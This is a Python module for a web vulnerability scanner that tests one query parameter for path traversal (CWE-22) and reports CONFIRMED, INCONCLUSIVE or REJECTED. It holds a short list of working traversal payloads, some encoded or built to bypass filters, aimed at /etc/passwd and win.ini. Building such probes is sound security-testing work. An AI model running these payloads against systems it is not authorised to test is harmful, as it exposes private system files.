"""Deterministic path-traversal / LFI probe.

Substitutes a query parameter with a bounded list of well-known
traversal payloads and checks the response body for the corresponding
file's signature strings. Signals only when the signature appears in
the payload response *and not* in the baseline.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

TECHNIQUE_ID = "web_path_traversal"
CWE = "CWE-22"
OWASP = "A01:2021 — Broken Access Control"

# (payload → substring that unambiguously identifies the file we tried to read).
# Kept short + bounded — this is a probe, not a fuzz.
_PROBES: list[tuple[str, str]] = [
    ("../../../../etc/passwd", "root:x:0:0"),
    ("....//....//....//etc/passwd", "root:x:0:0"),
    ("..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0"),
    ("../../../../windows/win.ini", "[fonts]"),
    ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
]


@dataclass
class TraversalExchange:
    label: str
    url: str
    status_code: int
    signature_found: bool
    signature: str
    body_preview: str = ""

    def to_dict(self) -> dict[str, Any]:
        return self.__dict__


@dataclass
class TraversalResult:
    finding_status: str  # CONFIRMED | INCONCLUSIVE | REJECTED
    reason: str
    parameter: str = ""
    exchanges: list[TraversalExchange] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "finding_status": self.finding_status,
            "reason": self.reason,
            "parameter": self.parameter,
            "exchanges": [e.to_dict() for e in self.exchanges],
        }


def _replace_query_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    new_pairs = [(k, value if k == param else v) for k, v in pairs]
    return urlunparse(parsed._replace(query=urlencode(new_pairs)))


async def _fetch(client, url: str, sig: str, headers: dict[str, str] | None) -> TraversalExchange:
    try:
        r = await client.get(url, headers=headers or {})
        text = r.text if hasattr(r, "text") else ""
        return TraversalExchange(
            label="probe",
            url=url,
            status_code=r.status_code,
            signature_found=sig in text,
            signature=sig,
            body_preview=text[:200],
        )
    except Exception as exc:
        return TraversalExchange(
            label="probe",
            url=url,
            status_code=0,
            signature_found=False,
            signature=sig,
            body_preview=f"error: {exc!r}",
        )


async def probe(
    *,
    client,
    url: str,
    parameter: str,
    token: str | None = None,
) -> TraversalResult:
    parsed = urlparse(url)
    pairs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if parameter not in pairs:
        return TraversalResult(
            finding_status="INCONCLUSIVE",
            reason=f"parameter {parameter!r} not in URL query string",
            parameter=parameter,
        )
    headers: dict[str, str] = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    exchanges: list[TraversalExchange] = []
    # Baseline check with the original param value — if the signature already
    # appears there, the target is echoing something and the probe is unsafe.
    baseline = await _fetch(client, url, "root:x:0:0", headers)
    baseline.label = "baseline_passwd_signature"
    exchanges.append(baseline)
    if baseline.signature_found:
        return TraversalResult(
            finding_status="INCONCLUSIVE",
            reason="baseline already contains a passwd-file signature — probe not meaningful",
            parameter=parameter,
            exchanges=exchanges,
        )

    for payload, sig in _PROBES:
        probe_url = _replace_query_param(url, parameter, payload)
        ex = await _fetch(client, probe_url, sig, headers)
        ex.label = f"payload_{payload[:24]}"
        exchanges.append(ex)
        if ex.signature_found:
            return TraversalResult(
                finding_status="CONFIRMED",
                reason=(
                    f"payload {payload!r} in parameter {parameter!r} caused the response "
                    f"to include the signature {sig!r} — the endpoint reads and returns "
                    "arbitrary local files"
                ),
                parameter=parameter,
                exchanges=exchanges,
            )

    return TraversalResult(
        finding_status="REJECTED",
        reason="no traversal payload produced a file-content signature",
        parameter=parameter,
        exchanges=exchanges,
    )
